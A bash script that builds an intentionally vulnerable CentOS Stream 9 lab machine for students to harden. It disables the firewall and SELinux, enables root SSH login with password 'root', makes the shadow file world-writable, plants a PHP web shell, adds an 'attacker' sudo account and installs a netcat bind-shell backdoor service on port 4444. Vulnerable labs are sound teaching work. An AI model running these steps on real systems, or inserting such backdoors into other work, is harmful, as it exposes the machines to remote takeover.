#!/bin/bash
# Intentionally Vulnerable Script for CentOS Stream 9
# Use ONLY in an isolated educational lab environment!
# Run as root or with sudo privileges.

echo "Creating a vulnerable CentOS Stream 9 environment..."

# -------------------------------
# BEGINNER: Basic Vulnerabilities
# -------------------------------

echo "Disabling Firewalld and SELinux..."
systemctl stop firewalld && systemctl disable firewalld
sed -i 's/^SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config
setenforce 0
echo "Firewalld and SELinux disabled. The system is now wide open."

echo "Installing and enabling SSH with root login enabled..."
dnf install -y openssh-server
sed -i 's/^#PermitRootLogin yes/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/^PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
echo "root:root" | chpasswd
systemctl enable sshd && systemctl start sshd
echo "SSH installed. Root login is enabled with the password: root."

echo "Setting world-readable permissions on sensitive files..."
chmod 777 /etc/passwd /etc/shadow
echo "Permissions on sensitive system files have been weakened."

# -------------------------------
# INTERMEDIATE: Services Mismanagement
# -------------------------------

echo "Installing and misconfiguring HTTPD for WebShell exploitation..."
dnf install -y httpd php
cat <<EOF > /var/www/html/webshell.php
<?php if(isset(\$_GET['cmd'])) { echo shell_exec(\$_GET['cmd']); }?>
EOF
chmod 777 /var/www/html/webshell.php
systemctl enable httpd && systemctl start httpd
echo "HTTPD installed with a PHP-based backdoor uploaded (webshell.php)."

echo "Injecting malicious cron job..."
echo "* * * * * root echo 'pwned' > /tmp/cron.log" > /etc/cron.d/malicious
chmod 777 /etc/cron.d/malicious
echo "A malicious cron job is now running every minute as root."

# -------------------------------
# ADVANCED: Hardening and Persistence
# -------------------------------

echo "Adding a malicious sudo user..."
useradd -m attacker
echo "attacker:attackme" | chpasswd
usermod -aG wheel attacker
echo "User 'attacker' added with sudo privileges and password 'attackme'."

echo "Deploying a backdoor service..."
cat <<EOF > /etc/systemd/system/backdoor.service
[Unit]
Description=Backdoor Service
[Service]
ExecStart=/bin/bash -c 'nc -lvp 4444 -e /bin/bash'
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor
systemctl start backdoor
echo "Netcat backdoor service deployed on port 4444."

echo "Weakening kernel and network settings..."
sysctl -w net.ipv4.conf.all.forwarding=1
sysctl -w kernel.randomize_va_space=0
echo "IPv4 forwarding enabled and ASLR disabled. Students must fix these settings."

echo "Vulnerable CentOS Stream 9 configuration complete!"